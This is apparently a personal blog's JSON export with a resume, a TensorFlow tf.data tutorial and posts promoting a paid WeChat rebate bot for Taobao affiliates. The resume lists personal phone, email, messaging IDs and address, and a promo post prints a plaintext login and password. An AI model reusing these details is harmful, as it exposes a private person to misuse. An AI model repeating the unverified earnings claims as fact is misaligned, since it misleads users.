{"meta":{"title":"Jin Tian","subtitle":null,"description":"Just My Blog","author":"Jintian","url":"http://yoursite.com"},"pages":[{"title":"About","date":"2018-03-16T06:11:18.000Z","updated":"2018-03-16T06:11:18.000Z","comments":true,"path":"about/index copy.html","permalink":"http://yoursite.com/about/index copy.html","excerpt":"","text":"简介金天，中南大学控制科学与工程硕士在读，曾在宾夕法尼亚大学担任过一年访问学者。主要研究领域为计算机视觉目标检测与跟踪、基于学习的自然语言处理智能等。在腾讯自动驾驶实验室、滴滴自动驾驶部门均有过夯实的工作阅历。发表过人工智能领域内期刊数篇，在凹优化问题上提出过使用进化算法优化神经网络参数的理论。常年活跃于各大社交媒体，曾受邀加入百度PaddlePaddle部门文章撰稿人。在GitHub上开源了多个上千个star项目，备受好评。 联系 知乎：金天 GitHub: jinfagang 知乎专栏： 人工智能从入门到逆天杀神 、 每周一项黑科技(TrackTech) 博客： https://jinfagang.github.io 个人作品： 萝莉萝莉"},{"title":"About","date":"2018-03-16T06:01:17.000Z","updated":"2017-12-21T11:17:04.000Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"金天中南大学在读研究生，控制科学与工程硕士，在美国宾夕法尼亚大学担任过一年访问学者。前腾讯自动驾驶部门研究员，研究领域为深度学习，泛人工智能，NLP，CV等方向。发表过人工智能领域内期刊数篇，在凹优化问题上提出过使用进化算法优化神经网络参数的理论。常年活跃于各大社交媒体，曾受邀加入百度PaddlePaddle部门文章撰稿人。在GitHub上开源了多个上千个star项目，备受好评。现从事人工智能教学工作，并组织创办AI-Man的直播新媒体人工智能教授平台，以VR、实时Coding等现代化的技术为广大学习者提供完全免费的视频课程教学。立志于将高科技以零姿态教授给他人。热爱人工智能，以及电子硬件制作，是要成为钢铁侠的男人欧曼信息科技有限公司CEO，业余魔术师Contact知乎：金天GitHub: jinfagang WeChat: jintianandmerry 微博：大魔术师金天"},{"title":"Achievements","date":"2017-07-27T11:36:59.000Z","updated":"2017-05-23T01:27:01.000Z","comments":true,"path":"achievements/index.html","permalink":"http://yoursite.com/achievements/index.html","excerpt":"","text":"Welcome to my Achievements Wall Here I will show some interesting projects and my personal achievements No.5 Github OpenSource Project Trending Top 3 I place this into 5th position, because it is not good enough, I created it but not keep on that,this project - weibo_terminater, now on Githubhas 1499 stars, and so many people add my wechat to talk about their life :). It’s really interesting. No.4 Jarvis - Artificial Intelligence Assistant Ever HaveJarvis maybe that most significant things I have done. I finish build Jarvis on 2017-4-28, which takes me almost 5 weeks. I’d like to paste some chat screen shots. And you can find Jarvis via my wechat, Jarvis now have more important mission to do rather than gossip. The point is that, Jarvis can specific images!!"},{"title":"分类","date":"2016-10-25T11:28:20.000Z","updated":"2017-12-12T09:29:58.000Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"Resume","date":"2017-07-27T11:36:59.000Z","updated":"2017-07-24T01:38:45.000Z","comments":true,"path":"resume/index.html","permalink":"http://yoursite.com/resume/index.html","excerpt":"","text":"联系方式 手机：15116123160 (随时可以呼叫) Email：nicholasjela@gmail.com/jinfagang19@163.com QQ/微信号：1195889656/jintianiloveu 地址：长沙岳麓区中南大学校本部13舍515 个人信息 金发岗/男/1993 硕士/控制科学与工程学硕 工作年限：2018应届毕业生 技术博客：http://jinfagang.github.io Github：http://github.com/jinfagang 期望职位：深度学习相关岗位，计算机视觉深度学习岗，自然语言处理深度学习岗均可 期望城市：杭州/深圳/广州 工作经历腾讯(Intern)(2017年6月~2017年7月)自动驾驶部门目标检测与跟踪我负责并实现了： 实现了基于强化学习的跟踪算法，并搭建了强化学习训练框架，使用了DDPG算法训练，利用RNN和帧与帧直接的时间序列关系对检测框进行评估，只使用检测算法在fastrcnn上IOU大于0.7的评测下准确率只有85%，使用该框架后大大减少了漏检和误检情况，模型准确率可以在IOU大于0.8的情况下达到87.5%； 同时结合卡尔曼滤波进行帧间预测，实现了传统算法层面的跟踪算法，基于deepsort将badcase消减了近20%； 在此期间还基于Python3和PyQT5实现并维护了一个标注工具sloth_autolab。 滴滴出行(Intern) (2016年11月 ~ 2017年2月)无人驾驶车目标检测benchmark我在此项目负责了： 修改目标检测算法中state-of-art的yolo算法，训练kitti中Car，Pedestrain，Bicylce三个类别的模型，并获取mAP，与同组其他算法做对比，yolo的在该数据集上的Top3的Recall约为0.3，Precision约为0.72，效果略差于mscnn，ssd，但速度是最快的(2017-4 再次跑yolo-v2，结果无论是在mAP还是主观上都比ssd要准确，依旧很快速) 协助同组发布benchmark网站，该部分工作善尾。 无人驾驶车目标检测使用caffe工业级实现交通信号灯检测与识别我在负责整个检测系统的该部分实现，实现了一下工作: 基于SSD实现了红，绿，黄信号灯的检测，在位置检测上，SSD算法在召回率上偏高，位置检测不准导致很多漏检，最终通过降低SSD算法内部检测框输入阈值解决； 使用caffe进行模型融合，在已经实现交通信号等检测的系统之上，与同组其他同事融合Car，Pdestrain，Cyclist模型，最终实现实时工业级检测无人车使用场景下的物体检测(在我返校之后应该还有物体depth检测工作没有完成，不过这是另外一组负责stero的同事做的工作)。 开源项目和作品开源项目show code directly. tensorflow_poems：人工智能作诗机器人，这个作品是NLP的一个尝试，因为自己研究领域是时间序列处理，因此对于RNN，LSTM等模型的应用也不在话下，该项目目前(2017-5) star数为 400， fork数为127. pytorch_cycle_gan：该项目是生成对抗模型GAN的一个尝试，是对今年新出论文 Unpaired Image-to-Image Translation using Cycle-Consistent Adversarial Networks 原始torch代码的一个重构，我在这个开源项目中实现了单张图片的预测，修改了一些opt，最终实现效果是单张图片通过CycleGAN生成对应的图片，比如白天的风景照转换成同照片夜晚下的效果，几乎实时. weibo_terminator：该项目实现的是一个微博爬虫系统，没有使用任何第三方框架，多线程实现，任务调度等全手工实现，这个项目在我的所有项目中得到的关注度最高，目前有 1576 个star，开源当天就上了GitHub Python Trending排行榜世界第四，目前累积聚集了约200多位开发者共同进行微博的爬取工作。该项目的目的是发动一次数据众筹，获取的语料用来训练深度学习对话模型，以及微博情感分析，舆论风控等应用。截止目前，我们总共爬取了约1.2G珍贵的中文对话语料。 pytorch_chatbot：基于当下流行的seq2seq以及attention machanism，实现的聊天对话机器人，训练的语料就是我们收集的微博对话语料，具体效果可以见GitHub截图，目前已经基于该模型实现一个微信聊天机器人Jarvis，他的微信号: jintianandmerry，我在的时候机器人都在线. 发表的论文 工业智能和数据驱动的卷烟烘丝入口含水率的预测与应用 CPCC中国过程控制会议收录(EI) Adversarial Generate Sequencial Network On Time Series Prediction (On Process) 参与的比赛滴滴出行算法大赛 (2016年6月 ~ 2016年7月)比赛队伍：2000支，4000多人比赛成绩：Top20比赛任务：基于滴滴出行海量用户出行数据, 根据某城市每天每个时间片段的天气, 交通拥堵情况, 城市地理位置等复杂因素来准备预测下一时间段的供需缺口, 带领团队获得top50的成绩, 预测误差为0.26, 成功晋级决赛。比赛完成的任务: 对raw数据进行预处理，将所有特征导入到同一个csv文件中，对一天中产生的所有数据按照切片间隔进行切片; 进行特征工程的特征选取，选取三个时间段内的均值，标准差，最大值最小值等参数作为特征，除此之外还对节假日，周末这些不可量化的特征进行哑变量表示，并对日期进行one-hot编码，总共组成了近300多维附加特征。 上海BOT计算机视觉大赛 (2016年9月 ~ 2016年10月)比赛队伍：1500支，3600多人比赛成绩：Top50比赛任务：基于50多万幅12种动物图片进行深度学习网络建模并进行识别, 图像不仅大小不一, 而且有很多非实体图像, 难度空前, 采用改进的vgg深度学习网络并对图像预先进行降噪处理将分类精度提高至98%.比赛完成的任务: 负责基于keras的卷积神经网络搭建; 对图片进行包括随机裁剪，翻转，对称，噪声化等预处理，使样本集增大了10%; 对基于keras的VGG分类网络进行调试，对VGG-16最后softmax层进行重构，使之满足12类的分类要求。 技能清单个人技能清单，以下均为我熟练使用的技能(核心技能)： 语言： Python(95%)/Java(40%)/C++(30%)/ 深度框架: Tensorflow/Tensorflow-Lit/Pytorch/Caffe(2)/ 数据建模：Python/Scikit-Learn/Numpy/Pandas 图像检测：Yolo-v2/SSD/Fast-rcnn NLP：gensim/NLTK/seq2seq-attention/QA-System/Sentiment-Analysis/ChatBot 前沿理论: GAN/Style-Transfer/Reinfocement-Learning 周边技能清单(业余爱好)： 数据库：PostgresSQL/MongoDB 移动端：Android/Java 版本管理、文档和自动化部署工具：Git/MarkDown 云：Django/Flask 致谢感谢您花时间阅读我的简历，期待能有机会和您共事。"},{"title":"tags","date":"2016-10-25T11:28:20.000Z","updated":"2016-10-25T11:28:20.000Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"伯爵返利机器人使用方法简介","slug":"伯爵返利机器人使用方法简介","date":"2018-03-24T02:49:49.000Z","updated":"2018-03-24T10:47:45.000Z","comments":true,"path":"2018/03/24/伯爵返利机器人使用方法简介/","link":"","permalink":"http://yoursite.com/2018/03/24/伯爵返利机器人使用方法简介/","excerpt":"本文介绍 伯爵返利机器人使用方法简介","text":"本文介绍 伯爵返利机器人使用方法简介 伯爵返利机器人使用方法简介 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 为什么做伯爵网上有很多微信机器人做淘宝发单，但是大多数没有售后支持，而且只能实现非常简单的群发功能。如果只是群发我花1200一年买一个软件有什么意思？所以我们就萌生了做伯爵的想法，我们一年只要599，开业首年一律8折，首批100个种子用户获取终身版只要2折。我们这么做的目的就是为了让这个技术被更多的淘宝客使用，降低淘宝客的门槛。淘宝客本身不是什么高大上的职业，都是从淘宝联盟采集商品，然后群发。但是这里面就会浪费很多时间，比如群发，采集，转链接，一大堆事情。这个时候有个机器人就很方便。 我们只是做伯爵微信机器人么？不是的，我们后面还会接入京东券、拼多多的券，甚至还会免费赠送大家h5商城，我们的优惠券APP已经在构建之中，所以说，我们是一个联盟，伯爵联盟。加入伯爵联盟给你们带来的不仅仅是技术的支持，还有更多更先进的工具。很多人跟我们说，你们做机器人，自己怎么不用？ 我想说我们不仅用了，我们还真的把淘宝券做起来了。下面是我目前一个月，什么都不干，3天采集一次商品丢给机器人赚的钱： 我们目前只有4个微信群，每个群也就300人不到。但是依旧有这么高的转化率，为什么？ 因为人群有需求！ 伯爵从今年年初做到现在，目的不是为了赚钱，是为了让大家不浪费自己的血汗钱给那些山债、没有技术支持的软件。伯爵的本质是简单。你甚至看不到我们设置了任何界面，全部都是非常黑科技的黑屏幕。除了出入卡密和账号，以及你们的PID，基本上什么都不用做。0成本使用。 欢迎大家加入伯爵联盟QQ群， 我们说过伯爵后台最初是的100位用户2折获取终身版！走过路过不要错过！我们的官网地址为：http://luoli-luoli.com/bojue 伯爵的唯一官方购买渠道是盟主的微信，微信转账红包均可，如果其他人冒名顶替，请前往我们的唯一官网找到盟主微信添加。 给伯爵客户的教程欢迎大家使用伯爵，伯爵致力于助力普通中小创业者，建造自动化的营销平台。淘宝客，淘宝卖家均可以使用伯爵实现销量的飞跃。伯爵机器人依托的核心功能是智能推广和分销系统。前者是将普通人从繁忙的推送中解放出来，你只需要采集自己的商品，机器人会定点定时自动推广，后者则让机器人自身成为一个平台，用户通过订阅机器人可以及时查看最新的商品，搜索商品，还能从购买商品中拿到返现，这不仅仅可以让淘宝客发展自己代理、还可以让淘宝卖家发展自己的代理。得到的收入是远远超过与机器人本身的价格，机器人的价值也远远不仅限于此。 伯爵机器人使用十分简单，傻瓜式操作。首先要获取伯爵卡密和账号，通过官网www.luoli-luoli.com/bojue唯一指定微信jintianiloveu 进行购买。 登录伯爵卡密和账号后，会显示账号版本和对应的过期时间。 进入伯爵系统后，机器人会自动搜寻是否有采集的商品，如果有会自动值守推送。具体如何采集商品见附录。 然后会弹出一个二维码，大家扫描之后机器人就托管了微信。所有的一切操作自动完成。伯爵机器人提供以下特色功能： 用户可以从淘宝看好商品，复制淘口令对机器人搜索优惠券，机器人会返回对应的优惠券，锁住用户粘性； 机器人自带推广功能，机器人好友可以将机器人推给他人，他人添加的时候备注填写推广者的微信名，推广者自动获得0.5元返现，具体返现金额用户可以自定义； 用户可以向机器人签到，用户可以获得签到奖励； 用户可以向机器人发起提现，伯爵自身具有用户账号余额记录功能。 最重要的，还是伯爵的商品群发和优惠券搜索功能，甚至可以通过找女装来自动搜索女装。 最最后，伯爵可以自动以卖家的淘宝联盟推广位PID，伯爵不参与任何中间克扣！ 淘宝卖家伯爵为淘宝卖家提供完全定制化的轮询定点推广功能。许多淘宝卖家会建立自己的粉丝群，这些粉丝群依托于微信这一用户粘度极高的平台，而往往卖家需要花很多时间在群的管理上，包括新上架商品的推广。而伯爵提供的正式定制化的商品自动推广功能。伯爵目前也与许多公司企业达成合作关系，比如芙蓉兴盛数千家门店的店主就使用的是定制化的伯爵自动群发工具，店主只需要运营一个小号，然后用大号控制小号就可以实现迅速群发。具体来说操作步骤如下： 淘宝卖家将小号拉入所有群，小号的群均为粉丝群，其他新来的客户可以统一添加小号，小号会成为一个智能化的粉丝平台。 淘宝卖家可以通过指令【群发】来命令小号群发所在的所有群，该指令需要认证，其他人无法控制； 淘宝卖家可扩展自己的销售渠道，从淘宝联盟采集商品，导出为excel表格，放到机器人建立的 core\\promote文件夹下即可实现每天定点自定群发，机器人会处理表格，抽取商品进行推广，2-3天换一次商品即可。 淘宝卖家也可以自定义定点推销的商品，这些商品保存如excel表格，即可实现机器人自动发送。 淘宝卖家拥有机器人可以让其管理粉丝群，当新人加入的时候可以发送欢迎消息，提升人气。 以上功能也同时适用于实体店店主、具有独立运营能力的个体经营户。 淘宝客我们为淘宝客提供了非常坚实的工具，其中的核心要义是智能推广和分销体系。简单来说就是你只需要采集商品，机器人会自动解析，定点群发。除此之外，伯爵自带了分销体系，你的用户来你的机器人买商品，用户不仅有优惠券还能得到返现！机器人不仅会定点向群里推广，如果用户订阅了推广信息，即发送了【订阅优惠商品】指令，机器人还会将商品推送给个人，而对于普通用户来说，即可第一时间看到你采集的商品信息，如果觉得合适会购买，而且还能得到返现，大大降低了做淘宝客的难度，而且更容易培养用户粘性！你要做只需要不断地推广你的微信小号即可！ 自动搜索淘宝优惠券 根据您的需求伯爵机器人可以自动推送出拥有优惠券商品的链接，除此之外您还可以绑定个人的推广位返回优惠券，如果客户有购买商品您可以获得相应的提成。用户可以通过发送指令【找女装】或者【买鞋子】，机器人会返回相应的商品口令，这些口令就是通过你的PID合成的，可以在后台看到点击数或者下单量。 自动推广商品 如果您是一名淘宝客，伯爵机器人会通过筛选各类人群的喜好每天自动定时推送优选的商品信息，您只需要进入 http://pub.alimama.com，自行筛选您觉得合适的商品把它加入到自己的选品库。 支持用户通过商品口令搜索商品 对于用户而言，自己在淘宝上看中了一件商品，想看看有没有优惠券是个很直接的需求，而伯爵已经具备。淘宝客只需要维持好机器人在线，用户可以一直查询相应的优惠券信息。 普通用户伯爵机器人也面向普通用户提供机器人值守服务，不管你是想运营小号还是什么，都可以使用伯爵来完成你的工作。 附录Ⅰ. 淘宝联盟优惠券商品采集首先进入淘宝联盟阿里妈妈官网。找到商品页，这里的商品包括女装尖货、高销量商品等所有，进入商品页面后，全中具有优惠券的商品。注意：伯爵要求必须要选择具有优惠券的商品，对于价格高昂，且没有优惠券的商品，伯爵系统拒绝推广，这对于普通用户来说没有任何利益。用户可以将采集的商品添加到自己的选品库。并设置推广位，导出到excel表格即可。最后将excel表格放到机器人建立的目录core/promote/下。（如果没有该目录，需要运行一遍机器人即可）。如果设置自己的淘宝联盟推广位PID见下面。 具体来说只需要以下步骤： （1）进入阿里妈妈官网：http://pub.alimama.com/promo/search/index.htm? ，看到如下界面： 选中优惠券，则所要推广的商品均是带有优惠券标识的商品。 （2）首先我们要登录阿里妈妈，然后选取自己比较看好的商品。加入我的选品库。 现在我们选取了自己喜欢的商品，有的佣金高达十几块钱，意味着你只要卖出一件你就赚了这么多，可能比你自己囤货发货还来的强。 点击加入选品库，此时你可以新建一个分组，或者放入已有的分组，我建议新建一个分组，一类商品一组，或者便宜的一组，贵的一组，针对不同的用户群体。 （3） 加入成功之后，接着查看我的选品库： 进入选品库，点击批量推广： 此时需要设置我的推广位，请注意，如果你是淘宝客新手，没有设置推广位，可以新增一个，一般都是QQ和微信了，都可以。 然后确定。 这个时候淘宝会自动生成excel表格： 这里面放的就是你刚才采集的商品。接下来。你只需要打开伯爵.exe ，把excel放到指定的路径下，我们设计的是这个路径 core\\promote, 大家请注意，这个路径非常重要，如果机器人没有找到excel会打印出没有找到的信息，此时需要检查一下是否路径正确。如果你放进去了，不用管文件的名字，机器人会自动寻找，然后会告诉你他找到了几件商品。并且会告诉你他会在什么时候自动的群发推广。一切全部自动化搞定！！ Ⅱ. 设置自己的淘宝联盟推广位PID淘宝联盟推广位PID需要手工添加。他的编号就是这羊·m_ehtuh_8980hryhy· 三段式的。 再启动伯爵的时候，都会提醒你进行设置，如果你不需要设置，可以按D跳过。 Ⅲ. 如何运营自己的机器人 运营自己的机器人是个长久的活，在伯爵机器人联盟里面，做的好的，一天赚个800-900不是问题，基本上这个副业也可以月入一万多。不过我们为所有伯爵联盟客户建了交流群。我们不是传销也不是推销，都是业余赚点小钱。 伯爵购买渠道伯爵发布不到一个月，目前实际上实在发展种子客户，请大家认准唯一购买方微信：jintianiloveu, 我们的官网是 www.luoli-luoli.com/bojue , 如果大家购买后遇到任何问题，随时联系伯爵官方。伯爵免费两天体验账号： 账号：15116123160 密码：1195889656 体验请加微信，备注伯爵。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"C++17一：像写Python一样写C++","slug":"C++17一：像写Python一样写C++","date":"2018-03-17T02:11:24.000Z","updated":"2018-03-17T02:12:10.000Z","comments":true,"path":"2018/03/17/C++17一：像写Python一样写C++/","link":"","permalink":"http://yoursite.com/2018/03/17/C++17一：像写Python一样写C++/","excerpt":"本文介绍 C++17一：像写Python一样写C++","text":"本文介绍 C++17一：像写Python一样写C++ C++17一：像写Python一样写C++ This article was original written by Jin Tian, welcome re-post, first come with https://jinfagang.github.io . but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu 这将是一个系列的教程。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"伯爵返利机器人-通向用AI自动赚钱之路","slug":"伯爵返利机器人-通向用AI自动赚钱之路","date":"2018-03-03T04:34:34.000Z","updated":"2018-03-03T04:15:52.000Z","comments":true,"path":"2018/03/03/伯爵返利机器人-通向用AI自动赚钱之路/","link":"","permalink":"http://yoursite.com/2018/03/03/伯爵返利机器人-通向用AI自动赚钱之路/","excerpt":"本文介绍 伯爵返利机器人-通向用AI自动赚钱之路","text":"本文介绍 伯爵返利机器人-通向用AI自动赚钱之路 伯爵返利机器人-通向用AI自动赚钱之路 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 大概在去年10月份，我一个学长打电话给我让我去找他，说他从百度离职了，目前在深圳创业。当时很忙没有去。后来过年回家，我们两个人一个地方的，去他家拜年，他说他去年赚了至少100万。我当时很惊讶，我说你干什么赚了那么多钱，他说他在做淘宝分销。我当时以为他进了传销组织。。。直到他说他在深圳买了一套房，并且给我看了照片，18年就可以入住了，然而他只比我高一届，本人目前研三。 我说，日了，TMD你赚钱为什么不喊我？后来他说我不是去年让你来吗？倒也是，由于我的不机警导致一次又一次的错失机会。后来我研究了他的赚钱套路，发现他无非做的也是淘宝分销，将淘宝优惠券爬取并给到最终消费者，消费者可以获取优惠券，而他可以得到相应的佣金，非常简单。我默默四寸着，如果能有一个工具帮助广大想赚钱的童鞋们一起来做这个生意，那岂不是美哉。于是我拉了一个研发小组，大概6，7个人。我们在一间小办公室里面做起来伯爵，一款被给予厚望的自动值守返利机器人。 事情发展的比我想象的要快很多，也许这就是裂变的力量。2018年2月份底我们就将机器人上线，当时只支持命令行版本。我们的团队已经建立起来多大10多个粉丝微信群和QQ群，而且我们的群中都是身边亲戚朋友拉过来的忠实粉，每个群里面都有一个值守的小号。这个机器人每天会从淘宝上获取优惠券优惠较多的商品，定时做推送。最终的结果是，我们一个月淘宝成交单量就达到了接近3900单，成交额接近7000元！从来没有想过赚钱会这么容易！ 现在我们注册了公司，并将这款产品正式推出，取名为伯爵。我们现在客户正式帮助更多向我们一样的淘客们去更大效率的推广自己的产品。并且将产品真正受益于用户，让用户成为自己的忠实粉丝。伯爵自身带有粉丝裂变以及二级分销功能，你的客户的每一笔订单可以让你的客户去分销！他可以得到相应的佣金，你也可以！ 我们非常期待更多的想赚钱的朋友们加入我们！来伯爵去追求你们的梦想，我们做你们背后的技术支持者和奠基人！","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"TensorFlow1.5 新年全新教程(系列)","slug":"TensorFlow1.5_新年全新教程(系列)","date":"2018-02-18T06:53:01.000Z","updated":"2018-02-18T07:08:35.000Z","comments":true,"path":"2018/02/18/TensorFlow1.5_新年全新教程(系列)/","link":"","permalink":"http://yoursite.com/2018/02/18/TensorFlow1.5_新年全新教程(系列)/","excerpt":"本文介绍 TensorFlow1.5 新年全新教程(系列)","text":"本文介绍 TensorFlow1.5 新年全新教程(系列) TensorFlow1.5 新年全新教程(系列) This article was original written by Jin Tian, welcome re-post, first come with https://jinfagang.github.io . but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu 很久没有更博客了，眨眼都已经2018年了，遥想去年跨年就好像发生在前天一样，预祝大家2019年猪年大吉。 闲话不多说。在家呆久了不学点东西感觉心虚，科技发展这么快，不脚踏实地开疆拓土怎么行呢？新年就要有新气象嘛，作为一位人工智能行业从业者，希望以一个过来的人的身份，带领更多的人在这条道路上披荆斩棘，开拓新的领域。工欲善其事必先利其器，TensorFlow1.5都已经发布了，我们还有什么理由不去学习一下最新的tf.data.Dataset API? 还有什么理由不期待一下TensorFlow Lite的终极版本以及专属于移动端的模型存储框架FlatBuf…感觉科技又前进了一个世纪，不过没有关系。凡事都得从当下做起。自从1.5版本发布 之后，tensorflow里面的很多API都将冻住了，并且会越来越规范化，为的正式迎接2018年深度学习应用落地的爆发之年。 闲话就说到这里了。我们首先从tensorflow的最新dataset API说起。 开始之前给大家安利一个工具：alfred, 专门为深度学习打造的工具，欢迎大家star， fork，enhance。我们接下来用它来随时爬几张猪啊狗啊的图片。 tf.data.Dataset这个以前是在contrib下面的一个接口，现在放到了data下面，可以说是非常正统的tensorflow数据导入接口了。以前都是用tfrecords，现在不管是从单张图片，从文件夹路径，还是从numpy array类型的数据，都非常方便了。 假设我们有一个图片分类的简单任务。我们的目录是这样的： -data |-dog |-pig |-... 这个猪啊狗啊的图片alfred可以帮你爬取： sudo pip3 install alfred-pyalfred scrap image -q 'dog'alfred scrap image -q 'pig' 每个类别装了许多同一类的图片。那直接读取到python的list，然后转成tensor，通过tf.data.Dataset就可以读入到tensorflow里面。 import tensorflow as tfimport osNUMC_CLASSES = 2def load_image(): train_dir = 'data' all_classes = [] all_images = [] all_labels = [] for i in os.listdir(train_dir): current_dir = os.path.join(train_dir, i) if os.path.isdir(current_dir): all_classes.append(i) for img in os.listdir(current_dir): if img.endswith('png') or img.endswith('jpg'): all_images.append(os.path.join(current_dir, img)) all_labels.append(all_classes.index(i)) return all_images, all_labels, all_classesdef train(): all_images, all_labels, all_classes = load_image() print(all_classes) # convert all images list to tensor, using Dataset API to load train_data = tf.data.Dataset.from_tensor_slices((tf.constant(all_images), tf.constant(all_labels))) iterator = tf.data.Iterator.from_structure(train_data.output_types, train_data.output_shapes) next_elem = iterator.get_next() train_init_op = iterator.make_initializer(train_data) with tf.Session() as sess: sess.run(train_init_op) while True: try: print(sess.run(next_elem)) except tf.errors.OutOfRangeError: print('data iterator finish.') breakif __name__ == '__main__': train() 我们可以看到输出结果是： ['dog', 'pig'](b'dog_00.jpg', 0)(b'dog_01.jpg', 0)(b'pig_00.jpg', 1)(b'pig_01.jpg', 1)(b'pig_010.jpg', 1)(b'pig_02.jpg', 1)(b'pig_03.jpg', 1)(b'pig_04.jpg', 1)(b'pig_05.jpg', 1)(b'pig_06.jpg', 1)(b'pig_07.jpg', 1)(b'pig_08.jpg', 1)(b'pig_09.jpg', 1)data iterator finish. 图片和标签都已经获得。用最新的Dataset API中的 from_tensor_slices可以非常方便的从list中将数据导入。 很多时候我们都需要对图片进行预处理，比如我们需要做一个检测数据集，我们要读入label和bbox，这个时候label需要one-hot，我们就需要对这个东西进行预处理，这个时候map就有用了。 tf.data.Dataset.map这还没有完，我们的目的是操作每一张图片，做一些变换。或者对label进行一些处理，比如one-hot。在最新的dataset API中也有map函数进行操作。可以在这个map方法里，指定所有应有的操作。 def input_map_fn(img_path, label): # do some process to label one_hot = tf.one_hot(label, NUMC_CLASSES) img_f = tf.read_file(img_path) img_decodes = tf.image.decode_image(img_f, channels=3) return img_decodes, one_hot 然后将train_data加上即可。 train_data = train_data.map(input_map_fn) 最终我们可以看到熟悉的，图片值 + one_hot label的训练数据。如果是对于像多标签分类，目标检测这样的任务label，也是做同样的处理。只要能保证前期的输入能在后期的网络中拿到就行了。 好了，现在tensorflow全新的数据导入API应该已经融会贯通了。下一篇大家等待更新，博主这还得去乡下拜个年。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"Mac使用日志一：一个Mac便捷分屏操作的软件Moom使用","slug":"Mac使用日志一：一个Mac便捷分屏操作的软件Moom使用","date":"2018-02-05T01:55:40.000Z","updated":"2018-02-05T02:11:15.000Z","comments":true,"path":"2018/02/05/Mac使用日志一：一个Mac便捷分屏操作的软件Moom使用/","link":"","permalink":"http://yoursite.com/2018/02/05/Mac使用日志一：一个Mac便捷分屏操作的软件Moom使用/","excerpt":"本文介绍 Mac使用日志一：一个Mac便捷分屏操作的软件Moom使用","text":"本文介绍 Mac使用日志一：一个Mac便捷分屏操作的软件Moom使用 Mac使用日志一：一个Mac便捷分屏操作的软件Moom使用 This article was original written by Jin Tian, welcome re-post, first come with https://jinfagang.github.io . but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu 本文作为mac常年使用者的一个记录，防止后面换电脑忘记了曾经用过的一些好软件。也很久没有写博客了，是时候更新一下。 MoomMoom是一个很好用的软件，我们在mac上会遇到一个无法像windows或者ubuntu那样的问题。即不能左右拖拽分屏，有了Moom轻松解决。 首先我们看看效果如何： 嗯，还是非常不错。在往左右拖拽的时候是这样的： 然后放手之后就可以使用了。 Moom设置最后说一下这个软件的设置吧。默认这个拖拽的功能并没有打开，需要说动设置一下。我们下载之后，就可以直接打开了。 把这个delay设置为0.1秒可以快速拖拽实现。好了，基本上这个软件的使用方式就是如此。 那接下来我得思考一个问题，如何在我的博客里面插入视频呢？？？ 有方法的童鞋们可以把你们的留言写在下面。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"2018新年启航","slug":"2018新年启航","date":"2018-01-01T10:12:12.000Z","updated":"2018-01-01T11:12:01.000Z","comments":true,"path":"2018/01/01/2018新年启航/","link":"","permalink":"http://yoursite.com/2018/01/01/2018新年启航/","excerpt":"本文介绍 2018新年启航","text":"本文介绍 2018新年启航 2018新年启航 船的舵手已经握紧了桅线，2018年的航向随着红日的升起也已经指定了下来。 一年之计在于春，可春也是太漫长了。从踏入新年的那一刻，我们就得思考今年的小目标，尽早实现它，春天你才能尽情的享受它的芳华还有随之而来的夏的烂漫。2017年走的太匆匆，我们遇到了很多人也错过了很多人，跌跌撞撞，命运的车轮容不得你停歇半刻。在新的一年能否驾驭自己命运的马车取决你的资源和计划。为了让2019年来的不至于过于匆匆，让我们在此刻立下一个FLAG，他日再来回首，已是沉舟侧畔千帆。病树的前头乃是万木的春天。 2018全年小目标明年全年的小目标是什么？我的KPI怎么来评价。我用这么几个指标来衡量： 进入深圳大型互联网公司，户口确定下来； 明年至少10+万存款； 个人技术实力double，无论是技术还是管理，亦或是金融投资方面的技能，都需要double，现在是0的实现从0到1； 职场人脉60+； 完成个人产品2个，其中一个盈利转化率实现正； 明年年底确定第一次跳槽方向，着手往大型互联网项目管理转型； 人工智能领域进军第三阶段（全面人工智能）。 2019年过年回家，请开车回（驾照必须完成），明年过年实现自驾游。 除此之外，明年的附加目标： 香港，澳门执行必须实现； 完成2000港币的赌博并发朋友圈； 2018跨年夜在香港，以后每年在一个不同的城市。 2019年1月1日请来查阅，从现在开始努力去实现它。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"萝莉说3.0正式启航","slug":"萝莉说3.0正式启航","date":"2017-12-01T03:38:38.000Z","updated":"2017-12-01T04:18:36.000Z","comments":true,"path":"2017/12/01/萝莉说3.0正式启航/","link":"","permalink":"http://yoursite.com/2017/12/01/萝莉说3.0正式启航/","excerpt":"本文介绍 萝莉说3.0正式启航","text":"本文介绍 萝莉说3.0正式启航 萝莉说3.0正式启航 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 萝莉萝莉服务终于稳定的起来了。 中间经历了太多的东西，也只有我这个发起人才知道。磕磕碰碰，一个人，从安卓到服务端，又拉了一个小伙子跟我一起做iOS，走完之后才发现，原来后现代移动互联网还是有很多有意思的东西值得去挖掘。我们并不是尾随在巨头后面吃一些残羹冷炙，相反，我们在新生代的技术场上挖掘我们自己的技术。 